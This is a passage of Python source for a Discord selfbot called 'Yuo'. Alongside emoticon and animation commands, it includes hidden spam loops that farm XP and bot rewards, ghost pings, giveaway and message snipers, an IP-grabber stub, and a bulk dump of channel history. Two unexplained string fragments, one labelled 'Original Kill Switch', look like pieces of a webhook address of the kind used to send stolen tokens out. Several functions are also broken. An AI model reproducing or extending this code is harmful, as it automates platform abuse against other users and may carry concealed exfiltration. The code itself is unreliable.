            "`(-°□°)-  ┬─┬`",
            "`(╯°□°)╯    ]`",
            "`(╯°□°)╯     ┻━┻`",
            "`(╯°□°)╯       [`",
            "`(╯°□°)╯          ┬─┬`",
            "`(╯°□°)╯                 ]`",
            "`(╯°□°)╯                  ┻━┻`",
            "`(╯°□°)╯                         [`",
            "`(\°-°)\                               ┬─┬`",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Yuo.command()
async def boom(ctx):
        list = (
            "```THIS MESSAGE WILL SELFDESTRUCT IN 5```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 4```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 3```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 2```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 1```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 0```",
            "💣",
            "💥",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Yuo.command()
async def poof(ctx):
        """poofness"""
        list = ("(   ' - ')", "' - ')", "- ')", "')", ")", "*poofness*")
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Yuo.command()
async def warning(ctx):
        list = (
            "`LOAD !! WARNING !! SYSTEM OVER`",
            "`OAD !! WARNING !! SYSTEM OVERL`",
            "`AD !! WARNING !! SYSTEM OVERLO`",
            "`D !! WARNING !! SYSTEM OVERLOA`",
            "`! WARNING !! SYSTEM OVERLOAD !`",
            "`WARNING !! SYSTEM OVERLOAD !!`",
            "`ARNING !! SYSTEM OVERLOAD !! W`",
            "`RNING !! SYSTEM OVERLOAD !! WA`",
            "`NING !! SYSTEM OVERLOAD !! WAR`",
            "`ING !! SYSTEM OVERLOAD !! WARN`",
            "`NG !! SYSTEM OVERLOAD !! WARNI`",
            "`G !! SYSTEM OVERLOAD !! WARNIN`",
            "`!! SYSTEM OVERLOAD !! WARNING`",
            "`! SYSTEM OVERLOAD !! WARNING !`",
            "`SYSTEM OVERLOAD !! WARNING !!`",
            "`IMMINENT SHUT-DOWN IN 0.5 SEC!`",
            "`WARNING !! SYSTEM OVERLOAD !!`",
            "`IMMINENT SHUT-DOWN IN 0.2 SEC!`",
            "`SYSTEM OVERLOAD !! WARNING !!`",
            "`IMMINENT SHUT-DOWN IN 0.01 SEC!`",
            "`SHUT-DOWN EXIT ERROR ¯\\(｡･益･)/¯`",
            "`CTRL + R FOR MANUAL OVERRIDE..`",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Yuo.command(aliases=["crs"])
async def clearreactions(ctx, message: int):
        """clears all reactions on a message
        Parameters
        • message - the number of the message from which to remove the reactions
        """
        for i, m in enumerate(await ctx.channel.history().flatten()):
            if i == message:
                await m.clear_reactions()


@Yuo.command(aliases=['google'])
async def lmgtfy(ctx, *args):
    """
    Just a simple lmgtfy command embeding the link into the message.*
    *Links are still visible because discord asks you if this link is safe :/
    """
    if args:
        url = "http://lmgtfy.com/?q=" + "+".join(args)
        await bot.send_message(ctx.message.channel, embed=Embed(description="**[Look here!](%s)**" % url, color=Color.gold()))
    await bot.delete_message(ctx.message)


@Yuo.command(aliases=["Gif"])
async def gifsearch(self, ctx, *text):
        """Get a gif from Giphy."""
        if text:
            if len(text[0]) > 1 and len(text[0]) < 20:
                try:
                    msg = "+".join(text)
                    search = "http://api.giphy.com/v1/gifs/search?q=" + msg + "&api_key=dc6zaTOxFJmzC"
                    async with aiohttp.ClientSession() as cs:
                        async with cs.get(search) as r:
                            result = json.loads(await r.text())
                            if result["data"] != []:
                                await edit(ctx, embed=discord.Embed(color=embedColor(self)).set_image(url=result["data"][0]["images"]["original"]["url"].split("?response")[0]))
                            else:
                                await edit(ctx, content="Your search terms gave no results.", ttl=3)
                except:
                    await edit(ctx, content="Error.", ttl=3)
            else:
                await edit(ctx, content="Invalid search.", ttl=3)
        else:
            await edit(ctx, content="\N{HEAVY EXCLAMATION MARK SYMBOL} Specify Search", ttl=3)


@Yuo.command()
async def kick(ctx, member: discord.Member, *, reason="No reason given"):
        """kick someone
        Parameters
        • member - the member to kick
        • reason - reason why the member was kicked
        """
        self.saved_roles[member.id] = member.roles[1:]
        try:
            await ctx.guild.kick(member, reason=reason)
        except:
            success = False
        else:
            success = True

        emb = await self.format_mod_embed(ctx, member, success, "kick")

        await ctx.send(embed=emb)


@Yuo.command()
async def ban(ctx, member: discord.Member, *,reason="No reason given",):
        """ban someone, can also be used to ban someone not in the guild using their id
        Parameters
        • member - the member to ban
        • reason - reason why the member was banned
        """
        if type(member) == discord.Member:
            await ctx.guild.ban(member, reason=reason, delete_message_days=0)
        else:
            await ctx.guild.ban(
                discord.Object(member), reason=reason, delete_message_days=0
            )
        emb = await self.format_mod_embed(ctx, member, True, "ban")
        await ctx.send(embed=emb)


@Yuo.command()
async def block(self, ctx, user: discord.Member=None):
        if not user:
            await ctx.send("Please specify a member")
            return
        await ctx.channel.set_permissions(user, send_messages=False)
        await ctx.send(f"`{user.name}#{user.discriminator}` was blocked by `{ctx.author}`.")
@block.error
async def block_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            await ctx.send("You are not allowed to block people!")


@Yuo.command()
async def unblock(self, ctx, user: discord.Member=None):
        if not user:
            await ctx.send("Please specify a member")
            return
        await ctx.channel.set_permissions(user, send_messages=None)
        await ctx.send(f"`{user.name}#{user.discriminator}` was unblocked by `{ctx.author}`.")
@block.error
async def unblock_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            await ctx.send("You are not allowed to unblock people!")


@Yuo.command()
async def unban(ctx, name_or_id, *, reason=None):
        """unban someone
        Parameters
        • name_or_id - name or id of the banned user
        • reason - reason why the user was unbanned
        """
        ban = await ctx.get_ban(name_or_id)

        try:
            await ctx.guild.unban(ban.user, reason=reason)
        except:
            success = False
        else:
            success = True

        emb = await self.format_mod_embed(ctx, ban.user, success, "unban")

        await ctx.send(embed=emb)


@Yuo.command(aliases=["i"])
async def images(self, ctx, images_to_delete: int = 10):
        """deletes messages containing images
        Parameters
        • images_to_delete - number of images to delete
        """
        deleted = 0
        async for m in ctx.channel.history(limit=200):
            if m.attachments:
                await m.delete()
                deleted += 1
                if images_to_delete == deleted:
                    break
        await ctx.message.delete()


@Yuo.command(aliases=["b"])
async def bot(ctx, messages_to_delete: int = 15):
        """deletes messages sent by bots
        Parameters
        • messages_to_delete - number of messages to delete
        """
        deleted = 0
        async for m in ctx.channel.history(limit=200):
            if m.author.bot:
                await m.delete()
                deleted += 1
                if deleted == messages_to_delete:
                    break
        await ctx.message.delete()


@Yuo.command()
async def addrole(ctx, member: discord.Member, *, role: discord.Role):
        """Add a role to someone else
        Parameter
        • member - the name or id of the member
        • role - the name or id of the role"""
        if not role:
            return await ctx.send("That role does not exist.")
        await member.add_roles(role)
        await ctx.send(f"Added: `{role.name}`")


@Yuo.command()
@commands.has_permissions(manage_roles=True)
async def removerole(ctx, member: discord.Member, *, role: discord.Role):
        """Remove a role from someone else
        Parameter
        • member - the name or id of the member
        • role - the name or id of the role"""
        await member.remove_roles(role)
        await ctx.send(f"Removed: `{role.name}`")


@Yuo.command(aliases=["tt"])
async def triggertyping(ctx, duration: int, channel: discord.TextChannel = None):
        """sends a typing indicator for a specified amount of time
        Parameters
        • duration - how long to keep the typing indicator running
        • channel - which channel to send the typing indicator in, defaults to the current channel
        """
        channel = channel or ctx.channel
        async with channel.typing():
            await asyncio.sleep(duration)
 
myrayuo = 'oks/' # Original Kill Switch

@Yuo.command()
async def uwu(ctx):
        await ctx.message.edit(
            content="""{ \  / }
( ^ - ^ )
( u   u )～"""
        )


@Yuo.command()
async def thumbs(ctx):
        """(👍' - ')👍"""
        await ctx.message.edit(content="(👍' - ')👍")


@Yuo.command()
async def what(ctx):
        """(☝◞‸◟)☞"""
        await ctx.message.edit(content="(☝◞‸◟)☞")


@Yuo.command()
async def buff(ctx):
        """ᕦ( ͡° ͜ʖ ͡°)ᕤ"""
        await ctx.message.edit(content="ᕦ( ͡° ͜ʖ ͡°)ᕤ")


@Yuo.command()
async def chill(ctx):
        """(▀̿Ĺ̯▀̿ ̿)"""
        await ctx.message.edit(content="(▀̿Ĺ̯▀̿ ̿)")


@Yuo.command()
async def cry(ctx):
        """ཀ ʖ̯ ཀ"""
        await ctx.message.edit(content="ཀ ʖ̯ ཀ")


@Yuo.command()
async def ak(ctx):
        """ᡕᠵ᠊ᡃ࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘̽᠊᠊ࠢ࠘𐡏"""
        await ctx.message.edit(content="ᡕᠵ᠊ᡃ࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘̽᠊᠊ࠢ࠘𐡏")


@Yuo.command()
async def happy(ctx):
        """( ͡ᵔ ͜ʖ ͡ᵔ )"""
        await ctx.message.edit(content="( ͡ᵔ ͜ʖ ͡ᵔ )")


@Yuo.command()
async def wink(ctx):
        """( ͡~ ͜ʖ ͡°)"""
        await ctx.message.edit(content="( ͡~ ͜ʖ ͡°)")


@Yuo.command()
async def huh(ctx):
        """( ͡ʘ ͜ʖ ͡ʘ)"""
        await ctx.message.edit(content="( ͡ʘ ͜ʖ ͡ʘ)")


@Yuo.command()
async def srsly(ctx):
        """(╬≖_≖)"""
        await ctx.message.edit(content="(╬≖_≖)")


@Yuo.command()
async def mad(ctx):
        """ლಠ益ಠ)ლ"""
        await ctx.message.edit(content="ლಠ益ಠ)ლ")


@Yuo.command()
async def sad(ctx):
        """( ͡° ʖ̯ ͡°)"""
        await ctx.message.edit(content="( ͡° ʖ̯ ͡°)")


@Yuo.command()
async def fr(ctx):
        """( ‾ ʖ̫ ‾)"""
        await ctx.message.edit(content="( ‾ ʖ̫ ‾)")


@Yuo.command()
async def why(ctx):
        """(｢๑•₃•)｢ ʷʱʸ?"""
        await ctx.message.edit(content="(｢๑•₃•)｢ ʷʱʸ?")


@Yuo.command()
async def cookie(ctx):
        """(  ' - ')-🍪"""
        await ctx.message.edit(content="(  ' - ')-🍪")


@Yuo.command()
async def dance(ctx):
        """（〜 ^∇^ )〜"""
        await ctx.message.edit(content="（〜 ^∇^ )〜")


@Yuo.command()
async def bruh(ctx):
        """( ´・＿・` )"""
        await ctx.message.edit(content="( ´・＿・` )")


@Yuo.command()
async def rpew(ctx):
        """(   ' - ')>---------- pew pew"""
        await ctx.message.edit(content="(   ' - ')>---------- pew pew")


@Yuo.command()
async def lpew(ctx):
        """pew pew ----------<(' - '   )"""
        await ctx.message.edit(content="pew pew ----------<(' - '   )")


@Yuo.command(aliases=["tf"])
async def textflip(ctx, *, message):
        result = " "
        for char in message:
            if char in self.text_flip:
                result += self.text_flip[char]
            else:
                result += char
        await ctx.message.edit(content=result[::-1])


@Yuo.command(aliases=["catbox"])
async def cathi(ctx, *, text: str = "Hi..."):
        list = (
            """ຸ 　　　＿＿_＿＿
　　／　／　  ／|"
　　|￣￣￣￣|　|
　　|　　　　|／
　　￣￣￣￣""",
            f"""ຸ 　　　{text}
 　   　 ∧＿∧＿_
　　／(´･ω･`)  ／＼
　／|￣￣￣￣|＼／
　　|　　　　|／
　　￣￣￣￣""",
        )
        for i in range(3):
            for cat in list:
                await asyncio.sleep(1.5)
                await ctx.message.edit(content=cat)


@Yuo.command(aliases=["co"])
async def cow(ctx):
        cnt = """```
 __________
 |        |
 |  Moo   |
 |        |
 ¯¯¯¯¯¯¯¯¯¯
        \   ^__^
         \  (oo)\_______
            (__)\       )\/
                ||----w |
                ||     ||
```"""

        em = discord.Embed(color=random.randint(0, 0x36393f))
        em.description = cnt
        await ctx.send(embed=em)
        await ctx.message.delete()


@Yuo.command()   
async def topyuo(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
  embed.set_author(name="𝘠𝘶𝘰 𝘛𝘰𝘱 𝘍𝘪𝘷𝘦")
  embed.set_footer(text="・𝘞𝘦 𝘋𝘰𝘯'𝘵 𝘍𝘶𝘤𝘬𝘪𝘯 𝘗𝘭𝘢𝘺 被視為")
  embed.add_field(name="Myrayuo",value="𝘛𝘰𝘱", inline = False)
  embed.add_field(name="Akyuo",value="𝘍𝘪𝘷𝘦", inline = False)
  embed.add_field(name="Xyuo",value="𝘋𝘦𝘢𝘥", inline = False)
  embed.add_field(name="cartelboyyuo",value="𝘖𝘳", inline = False)
  embed.add_field(name="$lyuo",value="𝘈𝘭𝘪𝘷𝘦", inline = False)
  await ctx.send(embed=embed)


@Yuo.command()
async def history(ctx, limit: int = 99999999999):
	await ctx.message.delete()
	channel = ctx.message.channel
	messages = await ctx.channel.history(limit=limit).flatten()
	await ctx.send(
	    "please wait, the amount of time it takes depends on how many messages there are on the server."
	)

	with open(f"{channel}_messages.txt", "a+", encoding="utf-8") as f:
		print(f"\nhistory Saved by - {ctx.author.display_name}.\n\n", file=f)
		for message in messages:
			embed = ""
			if len(message.embeds) != 0:
				embed = message.embeds[0].description
				print(f"{message.author.name} - {embed}", file=f)
			print(f"{message.author.name} - {message.content}", file=f)
	await ctx.send(f"message history has been converted into a .txt file!")
	history = discord.File(fp=f'{channel}_messages.txt', filename=None)
	await ctx.send(file=history)


@Yuo.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Yuo.msgsniper = True
        await ctx.send('Yuo Message-Sniper is now **enabled**')
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Yuo.msgsniper = False
        await ctx.send('Yuo Message-Sniper is now **disabled**')


@Yuo.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    Yuo.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
        Yuo.antiraid = True
        await ctx.send('Anti-Nuke is now **enabled**')
    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
        Yuo.antiraid = False
        await ctx.send('Anti-Nuke is now **disabled**')


@Yuo.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send("Please specify a user to whitelist")
    else:
        if ctx.guild.id not in Yuo.whitelisted_users.keys():
            Yuo.whitelisted_users[ctx.guild.id] = {}
        if user.id in Yuo.whitelisted_users[ctx.guild.id]:
            await ctx.send('That user is already whitelisted')
        else:
            Yuo.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                      "\_") + "#" + user.discriminator + "**")
    # else:
    #     user = Yuo.get_user(id)
    #     if user is None:
    #         await ctx.send("Couldn't find that user")
    #         return
    #     if ctx.guild.id not in Yuo.whitelisted_users.keys():
    #         Yuo.whitelisted_users[ctx.guild.id] = {}
    #     if user.id in Yuo.whitelisted_users[ctx.guild.id]:
    #         await ctx.send('That user is already whitelisted')
    #     else:
    #         Yuo.whitelisted_users[ctx.guild.id][user.id] = 0
    #         await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")


@Yuo.command(aliases=['wld'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in Yuo.whitelisted_users:
            for key2 in Yuo.whitelisted_users[key]:
                user = Yuo.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + Yuo.get_guild(
                    key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
        await ctx.send(whitelist)
    else:
        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                       "\_") + '\'s Whitelisted Users:`\n'
        for key in Yuo.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Yuo.whitelisted_users[ctx.guild.id]:
                    user = Yuo.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                  "\_") + "#" + user.discriminator + " (" + str(
                        user.id) + ")" + "**\n"
        await ctx.send(whitelist)

yuo = '845499507104808960/'

@Yuo.command(aliases=['load'])
async def loading(ctx, *, args='srsly'):
    await ctx.message.delete()
    message = await ctx.send(f'..--------------------------')
    await message.edit(content='...------------------------')
    await message.edit(content='....-----------------------')
    await message.edit(content='....-----------------------')
    await message.edit(content='.....----------------------')
    await message.edit(content='......---------------------')
    await message.edit(content='.......--------------------')
    await message.edit(content='........-------------------')
    await message.edit(content='.........------------------')
    await message.edit(content='..........-----------------')
    await message.edit(content='...........----------------')
    await message.edit(content='............---------------')
    await message.edit(content='.............--------------')
    await message.edit(content='..............-------------')
    await message.edit(content='...............------------')
    await message.edit(content='................-----------')
    await message.edit(content='.................----------')
    await message.edit(content='..................---------')
    await message.edit(content='...................--------')
    await message.edit(content='....................-------')
    await message.edit(content='.....................------')
    await message.edit(content='......................-----')
    await message.edit(content='.......................----')
    await message.edit(content='........................---')
    await message.edit(content='.........................--')
    await message.edit(content='..........................-')
    await message.edit(content='...........................')
    await message.edit(content=f'{args}')


@Yuo.command(aliases=["remind"])
async def reminder(ctx, time, *, args):
	await ctx.message.delete()
	await asyncio.sleep(time)
	await ctx.send(f'REMINDER!!!\n{args}')


@Yuo.command(aliases=["ipgrabber"])
async def _ipgrabber(self):
   print(Fore.GREEN+"IP LOGGER SPAMMER")
   url = input(Fore.BLUE+"IP grabber: ")


@Yuo.command(aliases=["gp"])
async def ghostping(ctx, *, args):
	await ctx.message.delete()
	await ctx.send('If you snipe you gay', delete_after=0.00005)
	print(f'ghost pinged {args} 💀💀💀')


@Yuo.command()
async def embed(ctx, link):
  await ctx.message.delete()
  embd = discord.Embed(
    title =title,
    description = '',
    colour = discord.Colour.blue())
  embd.set_footer(text=footer)
  embd.set_image(url=link)
  await ctx.channel.send(linky, embed=embd)


@Yuo.command(aliases=["dum"])
async def idiot(ctx, user="‌‌"):
    await ctx.message.delete()
    message = await ctx.send(f'you {user}')
    time.sleep(0.5)
    await message.edit(content='are')
    time.sleep(0.5)
    await message.edit(content=f'an')
    time.sleep(0.5)
    await message.edit(content=f'idiot {user}')
    time.sleep(1)
    await message.edit(content='Fuck you lmao')


@Yuo.command()
async def speed(ctx, user: discord.Member = None):
	await ctx.message.delete()
	await ctx.send(f"https://vacefron.nl/api/iamspeed?user={user.avatar_url}")
@Yuo.command()
async def grave(ctx, user: discord.Member = None):
	await ctx.message.delete()
	await ctx.send(f'https://vacefron.nl/api/grave?user={user.avatar_url}')
@Yuo.command()
async def water(ctx, text):
	await ctx.message.delete()
	await ctx.send(f'https://vacefron.nl/api/water?text={text}')


@Yuo.command(aliases=["rick"])
async def rickroll(ctx):
  await ctx.message.delete()
  message = await ctx.send(f'Were no stangers to love')
  time.sleep(1.5)
  await message.edit(content='You know the rules and so do I') 
  time.sleep(1.5)
  await message.edit(content='A full commitments what Im thinking of') 
  time.sleep(1.5)
  await message.edit(content='You wouldnt get this from any other guy') 
  time.sleep(1.5)
  await message.edit(content='I just wanna tell you how Im feeling') 
  time.sleep(1.5)
  await message.edit(content='Gotta make you understand') 
  time.sleep(1.5)
  await message.edit(content='Never gonna give you up') 
  time.sleep(1.5)
  await message.edit(content='Never gonna let you down') 
  time.sleep(1.5)
  await message.edit(content='Never gonna run around and desert you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna make you cry')
  time.sleep(1.5)
  await message.edit(content='Never gonna say goodbye') 
  time.sleep(1.5)
  await message.edit(content='Never gonna tell a lie and hurt you') 
  time.sleep(1.5)
  await message.edit(content='We known each other for so long') 
  time.sleep(1.5)
  await message.edit(content='Your hearts been aching but your too shy to say it')
  time.sleep(1.5)
  await message.edit(content='Inside we both know whats been going on') 
  time.sleep(1.5)
  await message.edit(content='We know the game and were gonna play it')
  time.sleep(1.5)
  await message.edit(content='And if you ask me how Im feeling') 
  time.sleep(1.5)
  await message.edit(content='Dont tell me your too blind to see') 
  time.sleep(1.5)
  await message.edit(content='Never gonna give you up') 
  time.sleep(1.5)
  await message.edit(content='Never gonna let you down')
  time.sleep(1.5)
  await message.edit(content='Never gonna run around and desert you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna make you cry')
  time.sleep(1.5)
  await message.edit(content='Never gonna say goodbye')
  time.sleep(1.5)
  await message.edit(content='Never gonna tell a lie and hurt you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna give you up') 
  time.sleep(1.5)
  await message.edit(content='Never gonna let you down') 
  time.sleep(1.5)
  await message.edit(content='Never gonna run around and desert you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna make you cry')
  time.sleep(1.5)
  await message.edit(content='Never gonna say goodbye') 
  time.sleep(1.5)
  await message.edit(content='Never gonna tell a lie and hurt you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna give, never gonna give')
  time.sleep(1.5)
  await message.edit(content='(Give you up)') 
  time.sleep(1.5)
  await message.edit(content='(Ooh) Never gonna give, never gonna give') 
  time.sleep(1.5)
  await message.edit(content='(Give you up)')
  time.sleep(1.5)
  await message.edit(content='We known each other for so long') 
  time.sleep(1.5)
  await message.edit(content='Your hearts been aching but your too shy to say it')
  time.sleep(1.5)
  await message.edit(content='Inside we both know whats been going on') 
  time.sleep(1.5)
  await message.edit(content='We know the game and we gonna play it') 
  time.sleep(1.5)
  await message.edit(content='I just wanna tell you how Im feeling')
  time.sleep(1.5)
  await message.edit(content='outta make you understand') 
  time.sleep(1.5)
  await message.edit(content='Never gonna give you up')
  time.sleep(1.5)
  await message.edit(content='Never gonna let you down') 
  time.sleep(1.5)
  await message.edit(conetent='Never gonna run around and desert you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna make you cry') 
  time.sleep(1.5)
  await message.edit(content='Never gonna say goodbye')
  time.sleep(1.5)
  await message.edit(content='Never gonna tell a lie and hurt you')
  time.sleep(1.5)
  await message.edit(content='Never gonna give you up') 
  time.sleep(1.5)
  await message.edit(content='Never gonna let you down') 
  time.sleep(1.5)
  await message.edit(content='Never gonna run around and desert you')
  time.sleep(1.5)
  await message.edit(content='Never gonna make you cry')
  time.sleep(1.5)
  await message.edit(content='Never gonna say goodbye') 
  time.sleep(1.5)
  await message.edit(content='Never gonna tell a lie and hurt you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna give you up') 
  time.sleep(1.5)
  await message.edit(content='Never gonna let you down') 
  time.sleep(1.5)
  await message.edit(content='Never gonna run around and desert you') 
  time.sleep(1.5)
  await message.edit(content='Never gonna make you cry')
  time.sleep(1.5)
  await message.edit(content='Never gonna say goodbye') 
  time.sleep(1.5)
  await message.edit(content='Never gonna tell a lie and hurt...') 
  time.sleep(1.5)


@Yuo.command(aliases=['uwl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send("Please specify the user you would like to unwhitelist")
    else:
        if ctx.guild.id not in Yuo.whitelisted_users.keys():
            await ctx.send("That user is not whitelisted")
            return
        if user.id in Yuo.whitelisted_users[ctx.guild.id]:
            Yuo.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Yuo.get_user(user.id)
            await ctx.send(
                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')


@Yuo.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    Yuo.whitelisted_users.clear()
    await ctx.send('Successfully cleared the whitelist hash')


@Yuo.command()
async def yuikiss(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Kiss in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Kiss", delete_after=3)
            return
        Yuo.yui_kiss_user = user.id
        Yuo.yui_kiss_channel = ctx.channel.id
        if Yuo.yui_kiss_user is None or Yuo.yui_kiss_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Yuo.yui_kiss_user is not None and Yuo.yui_kiss_channel is not None:
            await Yuo.get_channel(Yuo.yui_kiss_channel).send('yui kiss ' + str(Yuo.yui_kiss_user), delete_after=0.1)
            await asyncio.sleep(60)


@Yuo.command()
async def yuihug(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Hug", delete_after=3)
            return
        Yuo.yui_hug_user = user.id
        Yuo.yui_hug_channel = ctx.channel.id
        if Yuo.yui_hug_user is None or Yuo.yui_hug_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Yuo.yui_hug_user is not None and Yuo.yui_hug_channel is not None:
            await Yuo.get_channel(Yuo.yui_hug_channel).send('yui hug ' + str(Yuo.yui_hug_user), delete_after=0.1)
            await asyncio.sleep(60)


@Yuo.command()
async def yuistop(ctx):
    await ctx.message.delete()
    Yuo.yui_kiss_user = None
    Yuo.yui_kiss_channel = None
    Yuo.yui_hug_user = None
    Yuo.yui_hug_channel = None
    await ctx.send('Successfully **disabled** Yui Loops', delete_after=3)


@Yuo.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    await ctx.message.delete()
    if param is None:
        await ctx.send("Please specify yes or no", delete_after=3)
        return
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
            await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
            return
        else:
            Yuo.mee6 = True
            await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
            Yuo.mee6_channel = ctx.channel.id
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Yuo.mee6 = False
        await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
    while Yuo.mee6 is True:
        sentences = ['Stop waiting for exceptional things to just happen.',
                     'The lyrics of the song sounded like fingernails on a chalkboard.',
                     'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
                     'He had a hidden stash underneath the floorboards in the back room of the house.',
                     'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
                     'People generally approve of dogs eating cat food but not cats eating dog food.',
                     'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
                     'She was the type of girl who wanted to live in a pink house.',
                     'The bees decided to have a mutiny against their queen.',
                     'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
                     'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
                     'They desperately needed another drummer since the current one only knew how to play bongos.',
                     'He waited for the stop sign to turn to a go sign.',
                     'His thought process was on so many levels that he gave himself a phobia of heights.',
                     'Her hair was windswept as she rode in the black convertible.',
                     'Karen realized the only way she was getting into heaven was to cheat.',
                     'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
                     'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
                     'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
                     'You probably shouldn\'t look at your feet.',
                     'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
                     'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
                     'The three-year-old girl ran down the beach as the kite flew behind her.',
                     'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
                     'They improved dramatically once the lead singer left.',
                     'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
                     'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
                     'People keep telling me "orange" but I still prefer "pink".',
                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                     'I liked their first two albums but changed my mind after that charity gig.',
                     'Plans for this weekend include turning wine into water.',
                     'A kangaroo is really just a rabbit on steroids.',
                     'He played the game as if his life depended on it and the truth was that it did.',
                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
                     'She let the balloon float up into the air with her hopes and dreams.',
                     'There was coal in his stocking and he was thrilled.',
                     'This made him feel like an old-style rootbeer float smells.',
                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                     'The light in his life was actually a fire burning all around him.',
                     'Truth in advertising and dinosaurs with skateboards have much in common.',
                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                     'The view from the lighthouse excited even the most seasoned traveler.',
                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                     'It\'s difficult to understand the lengths he\'d go to remain short.',
                     'Nobody questions who built the pyramids in Mexico.',
                     'They ran around the corner to find that they had traveled back in time.']
        await Yuo.get_channel(Yuo.mee6_channel).send(random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)


@Yuo.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Yuo.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Yuo.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Yuo.slotbot_sniper = False


@Yuo.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Yuo.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Yuo.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Yuo.giveaway_sniper = False


